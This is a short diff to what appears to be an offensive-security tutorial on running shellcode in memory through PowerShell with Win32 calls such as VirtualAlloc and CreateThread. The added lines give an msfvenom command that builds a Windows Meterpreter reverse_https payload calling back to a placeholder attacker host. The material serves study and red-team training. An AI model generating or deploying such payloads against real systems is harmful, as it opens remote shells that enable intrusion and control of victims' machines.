@@ -533,6 +533,10 @@ Explanation :
 - We will be using Win32 API _VirtualAlloc_ and _CreateThread_, but for copying the shellcode we will use .Net Copy method function from the _System.Runtime.InteropServices.Marshal_
 - We will also use the _WaitForSingleObject_ function from the _kernel32.dll_ to prevent the shell from dying.
 
+MSFVENOM Payload :
+
+    msfvenom -p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port> EXITFUNC=thread -f ps1
+
 &nbsp;
 
 Powershell code :
